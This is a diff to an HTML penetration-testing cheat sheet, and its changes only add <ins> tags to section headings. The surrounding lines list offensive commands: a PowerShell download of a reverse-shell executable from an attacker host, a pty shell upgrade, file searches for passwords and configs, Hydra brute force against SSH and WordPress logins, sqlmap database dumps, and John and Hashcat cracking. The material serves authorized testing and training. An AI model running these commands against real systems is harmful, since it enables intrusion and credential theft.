@@ -39,11 +39,11 @@
 	<li> <a href='#n1.11'> John The Ripper </a>
  	<li> <a href='#n1.12'> Hashcat </a>
 		
-<h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Remote Desktop Protocol (RDP): </h3>
+<h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Remote Desktop Protocol (RDP): </ins></h3>
   <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
   <p><pre><code> xfreerdp /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;PASSWORD> +clipboard </code></pre>
 	
-<h3 id='n1.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PowerShell commands </h3>
+<h3 id='n1.2'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>PowerShell commands </ins></h3>
 <ul>
    <li> To get stable shell from unstable from PowerShell. FILENAME.exe is the reverse shell:
   <pre><code> powershell -c "Invoke-WebRequest -Uri 'http://&lt;LOCAL_IP>:&lt;PORT>/&lt;FILENAME.exe>' -OutFile 'C:\Windows\Temp\&lt;FILENAME.exe>'" </code></pre>
@@ -81,7 +81,7 @@
 
 </ul>
   
-<h3 id='n1.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Linux </h3>
+<h3 id='n1.3'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Linux </ins></h3>
 <h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
 	Find all files in / directory (-type d for find dirs):
 	<p> <pre><code> find / -type f </code></pre>
@@ -90,7 +90,7 @@
 	Find all path files with ‘config’ in proc dirs:
 	<p> <pre><code> find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null </code></pre>
 
-<h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Windows </h3>
+<h3 id='n1.4'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Windows </ins></h3>
 <h4> &nbsp;&nbsp;&nbsp; Commands to find </h4>
 	This command searches for the string "password" inside all files with the extensions .xml, .ini, .txt, and .config on the current C: drive:
  	<pre><code>cd C:\ & findstr /s /p /i /n /m "password" *.xml *.ini *.txt *.config</code></pre>
@@ -104,7 +104,7 @@
 		<li> /m - displays only the file name if a match is found
    	</ul>
 		
-<h3 id='n1.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Nmap with vulnerse script </h3>
+<h3 id='n1.5'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Nmap</ins> with vulnerse script </h3>
 Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'> download </a> script files from github and install it. Thanks for that, <a href='https://github.com/vulnerscom'> Vulners Team </a>!
 
    Checking for a vulnerability in the software on the server:
@@ -121,10 +121,10 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
    <p> <pre><code> nmap -sV -p &lt;PORT> --script http-enum &lt;TARGET_IP> </code></pre>
    <p> P.S. If CMS, research <code>&lt;name_0f_CMS_0r_DB> brute force nmap</code>
 	   
-<h3 id='n1.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Gobuster command: </h3>
+<h3 id='n1.6'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Gobuster command: </ins></h3>
    <pre><code> gobuster dir -u &lt;TARGET_URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </code></pre>
 		
-<h3 id='n1.7'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hydra </h3>
+<h3 id='n1.7'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hydra </ins></h3>
     &nbsp;&nbsp;&nbsp; Brute force against a protocol of some choice:
    	<pre><code> hydra -P &lt;WORLIST> -v &lt;TARGET_IP> &lt;PROTOCOL> </code></pre>
    <p> &nbsp;&nbsp;&nbsp; Brute Force ssh:
@@ -138,15 +138,15 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
    <p> &nbsp;&nbsp;&nbsp; Craft a more specific request for Hydra to brute force:
    	<pre><code> hydra -l &lt;USERNAME> -P .&lt;PASSWORD_LIST> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' </code></pre>
 		
-<h3 id='n1.8'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Dirsearch </h3>
+<h3 id='n1.8'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Dirsearch </ins></h3>
    Search a lot of interesting by extensions:
    <pre><code> dirsearch -e php,log,sql,txt,bak,tar,tar.gz,zip,rar,swp,gz,asp,aspx -u '&lt;TARGER_IP>' </code></pre>
 		
-<h3 id='n1.9'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python command to pump nc shell </h3>
+<h3 id='n1.9'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python command to <ins>pump</ins>nc shell </h3>
    PTY is a library for pseudo-terminal functionality that is part of the Standard Python Library. There is a nc shell and get pump shell:
    <pre><code> python -c 'import pty;pty.spawn("/bin/bash")' </code></pre>
 
-<h3 id='n1.10'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQLmap </h3>
+<h3 id='n1.10'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> SQLmap </ins></h3>
 	&nbsp;&nbsp;&nbsp; Start SQL injection attack:
  	<pre><code>sqlmap -u "&lt;TARGET_URL>" --dbs --batch</code></pre>
   		-u - target URL
@@ -167,7 +167,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
      	<pre><code>sqlmap -u "&lt;TARGET_URL>" -D &lt;db_name> --dump-all --batch</code></pre>
       		--dump-all - unload all information from the DBMS database 
 
- <h3 id='n1.11'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; John The Ripper </h3>
+ <h3 id='n1.11'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> John The Ripper </ins></h3>
  	Firstly use hash-identifier. 
  	<p><h4> &nbsp;&nbsp;&nbsp; Cracking some type of hashes: </h4>
   		<pre><code>john --format=raw-&lt;encryption> --wordlist=path/to/wordlist.txt to_crack.txt</code></pre>
@@ -198,7 +198,7 @@ Need to <a href='https://github.com/vulnersCom/nmap-vulners/archive/master.zip'>
 		<p> Then to crack the hash:
   		<pre><code>john zip.hashes</code></pre>
       
-<h3 id='n1.12'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hashcat </h3>
+<h3 id='n1.12'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Hashcat </ins></h3>
 	<p><h4> &nbsp;&nbsp;&nbsp; MD5 Hashes </h4>
  	<p> hash.txt > 8743b52063cd84097a65d1633f5c74f5
   	<p> Use:
